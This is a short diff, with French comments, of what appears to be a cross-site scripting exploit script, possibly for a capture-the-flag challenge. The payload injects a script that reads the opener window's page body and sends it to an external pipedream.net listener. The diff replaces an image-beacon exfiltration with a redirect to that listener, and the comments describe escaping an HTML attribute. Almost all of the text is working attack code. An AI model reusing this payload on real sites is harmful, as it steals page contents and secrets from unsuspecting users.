@@ -32,21 +32,12 @@
         // --- FIX DE LA CHAÎNE XSS ---
         // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
         const MALICIOUS_PAYLOAD = "<script>" +
-            "setTimeout(function() {" +
-                    "var text = section.innerText;" + 
-                    // 1. Extrait le secret en se basant sur le texte d'ancrage "Your secret:"
-                    "var secret = text.split('Your secret:')[1].trim();" + 
-                    
+            "setTimeout(function() {" +                   
                     // 2. Encode le secret pour l'URL
                     "var encodedSecret = window.opener.document.body.innerHTML;" +
-                    
-                    // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
-                    "var img = new Image();"+
-                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net/?secret=' + encodeURIComponent(encodedSecret);" +
-                    "document.body.appendChild(img);" +
+                    "document.location = `https://eotoci65n24zl7e.m.pipedream.net/?secret=${encodeURIComponent(encodedSecret)}`;" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
-                "}" +
             "}, 1000);</script>";
         
         // --- Exécution de l'attaque ---
